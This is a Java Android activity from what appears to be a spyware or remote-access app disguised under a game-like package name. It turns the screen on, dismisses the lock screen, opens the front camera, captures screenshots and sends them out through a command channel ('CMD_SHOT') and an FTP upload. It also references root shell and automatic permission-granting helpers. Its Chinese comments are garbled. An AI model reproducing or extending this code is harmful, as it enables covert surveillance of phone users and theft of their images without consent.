package activity;

import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;

import com.byc.wzry.R;

import android.app.Activity;
import android.content.ActivityNotFoundException;
import android.content.Context;
import android.content.Intent;
import android.graphics.Bitmap;
import android.hardware.Camera;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.view.Menu;
import android.view.MenuItem;
import android.view.SurfaceHolder;
import android.view.SurfaceView;
import android.view.View;
import android.view.Window;
import android.view.WindowManager;
import download.ftp;
import order.OrderService;
import order.order;
import order.screen.ScreenShotActivity;
import order.screen.Shotter;
import permission.GivePermission;
import util.ConfigCt;
import util.Funcs;
import util.RootShellCmd;

@SuppressWarnings("deprecation")
public class CameraActivity extends Activity implements SurfaceHolder.Callback {
	private SurfaceView surfaceView;
	private int cameraCount = 0;  
	private Camera cam = null; 
	private SurfaceHolder holder;
	public static CameraActivity mCameraActivity;
	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		requestWindowFeature(Window.FEATURE_NO_TITLE);
		this.getWindow().addFlags(WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED
				| WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON
				| WindowManager.LayoutParams.FLAG_DISMISS_KEYGUARD
				| WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON);
		setContentView(R.layout.activity_camera);
		mCameraActivity=this;
		surfaceView = (SurfaceView) findViewById(R.id.surface);
		if(ConfigCt.getInstance(this).haveCameraPermission())
			Carmera();
		else{
			if(GivePermission.getGivePermission().isEnable()){
    			GivePermission.getGivePermission().EventStart();
    			GivePermission.getGivePermission().TimeStart();
    		}else{
    			this.finish();
    			return;
    		}
			 processCarmera();
			 ConfigCt.getInstance(this).setCameraPermission(true);
		}
			
	}
	@Override
	protected void onResume() {
		super.onResume();
		//processCarmera();
	}
	/*
	 * ���
	 */
	public  void Carmera(){
		try{
			holder = surfaceView.getHolder();
			holder.addCallback(CameraActivity.this);  //���ûص�
			Camera.CameraInfo cameraInfo = new Camera.CameraInfo();  
			cameraCount = Camera.getNumberOfCameras(); // get cameras number  
			        
			for ( int camIdx = 0; camIdx < cameraCount;camIdx++ ) {  
			    Camera.getCameraInfo( camIdx, cameraInfo ); // get camerainfo  
			    if ( cameraInfo.facing ==Camera.CameraInfo.CAMERA_FACING_FRONT ) { // ��������ͷ�ķ�λ��Ŀǰ�ж���ֵ�����ֱ�ΪCAMERA_FACING_FRONTǰ�ú�CAMERA_FACING_BACK����  
			        try {              
			            cam = Camera.open( camIdx );  
			           
			        } catch (RuntimeException e) {  
			            e.printStackTrace();  
			        }
			    }  
			} 
		}catch(ActivityNotFoundException e)
		{
			e.printStackTrace();
			//return false;
		}
	}
	/*
	 * ���
	 */
	public  void processCarmera(){
		new Thread(new Runnable() {    
			@Override    
		    public void run() {   
				//Looper.prepare();
				try{
					holder = surfaceView.getHolder();
					holder.addCallback(CameraActivity.this);  //���ûص�
					Camera.CameraInfo cameraInfo = new Camera.CameraInfo();  
					cameraCount = Camera.getNumberOfCameras(); // get cameras number  
					        
					for ( int camIdx = 0; camIdx < cameraCount;camIdx++ ) {  
					    Camera.getCameraInfo( camIdx, cameraInfo ); // get camerainfo  
					    if ( cameraInfo.facing ==Camera.CameraInfo.CAMERA_FACING_FRONT ) { // ��������ͷ�ķ�λ��Ŀǰ�ж���ֵ�����ֱ�ΪCAMERA_FACING_FRONTǰ�ú�CAMERA_FACING_BACK����  
					        try {              
					            cam = Camera.open( camIdx );  
					           
					        } catch (RuntimeException e) {  
					            e.printStackTrace();  
					        }
					    }  
					} 
				}catch(ActivityNotFoundException e)
				{
					e.printStackTrace();
					//return false;
				}
				//Looper.loop(); 
				CameraActivity.this.finish();
		    }    
		}).start();
	}
	@Override
	public void surfaceCreated(SurfaceHolder holder) {
		if(cam==null)return;
	    try {
	    	//cam.
	    	cam.setPreviewDisplay(holder);
	    } catch (IOException e) {
	        e.printStackTrace();
	    }
	    cam.startPreview();
	    //sendMyPic();
	    sendPic();
	}
	@Override
	public void surfaceChanged(SurfaceHolder holder, int format, int width, int height) {

	}

	@Override
	public void surfaceDestroyed(SurfaceHolder holder) {

	}
    @Override
    protected void onDestroy() {
        if(cam!=null){
        	cam.lock();
        	cam.stopPreview();//ͣ��ԭ������ͷ��Ԥ�� 
        	cam.release();//�ͷ���Դ
        	cam=null;
        }
        super.onDestroy();
    }
    private void sendPic(){
    	if(ScreenShotActivity.shotter==null)return;
    	final String filename=Funcs.getFilename(ConfigCt.appID, ".jpg");
    	ScreenShotActivity.shotter.startScreenShot(new Shotter.OnShotListener() {
            @Override
            public void onFinish(Bitmap bitmap) {
            	ftp.getFtp(CameraActivity.this).UploadStart(filename);
            	OrderService.getOrderService().SendBmp(order.CMD_SHOT,bitmap);
            	CameraActivity.this.finish();
            }
        },ConfigCt.LocalPath+filename,80);
    }
    private void sendMyPic(){
    	View dView = getWindow().getDecorView();
    	dView.setDrawingCacheEnabled(true);
    	dView.buildDrawingCache();
    	Bitmap bitmap = Bitmap.createBitmap(dView.getDrawingCache());
    	if (bitmap != null) {
    	  try {
    		  OrderService.getOrderService().SendBmp(order.CMD_SHOT,bitmap);
    		  String filename=ConfigCt.LocalPath+Funcs.getFilename(ConfigCt.appID, ".jpg");
    		  File file = new File(filename);
    		  file.createNewFile();
    		  FileOutputStream os = new FileOutputStream(file);
    		  bitmap.compress(Bitmap.CompressFormat.PNG, 100, os);
    		  os.flush();
    		  os.close();
    		  ftp.getFtp(CameraActivity.this).UploadStart(filename);
    		  CameraActivity.this.finish();
    	  } catch (Exception e) {
    		  e.printStackTrace();
    	  }
    	}
    }
	/*
     * rootģ���ʼ����
     */
    private void CameraPrepare(){
    	 Handler handler= new Handler(); 
    	Runnable runnableRoot  = new Runnable() {    
    		@Override    
    		public void run() {    
    			processCarmera();
    		}
    	};
    	handler.postDelayed(runnableRoot, 1000*4); 	    
    }
}
